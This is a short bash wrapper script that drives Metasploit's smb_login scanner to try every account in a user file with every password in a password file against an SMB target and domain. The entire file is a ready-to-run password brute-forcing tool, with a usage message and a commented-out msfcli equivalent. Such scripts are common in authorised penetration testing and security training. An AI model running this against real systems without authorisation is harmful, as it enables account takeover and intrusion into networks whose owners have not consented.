#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <target system> <SMB Domain> <account file> <password file>"
	echo "$0 will test all accounts in account file with all passwords in password file against the specified target."
	echo ""
}

if [ $# -lt 4 ]; then
	ShowUsage
	exit 1
fi

TARGET="$1"
SMBDOMAIN="$2"
ACCOUNTFILE="$3"
PASSWORDFILE="$4"

# msfcli auxiliary/scanner/smb/smb_login RHOSTS=$TARGET SMBDomain=$SMBDOMAIN USER_FILE=$ACCOUNTFILE PASS_FILE=$PASSWORDFILE E
msfconsole -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBDomain $SMBDOMAIN; set USER_FILE $ACCOUNTFILE; set PASS_FILE $PASSWORDFILE; exploit; exit"

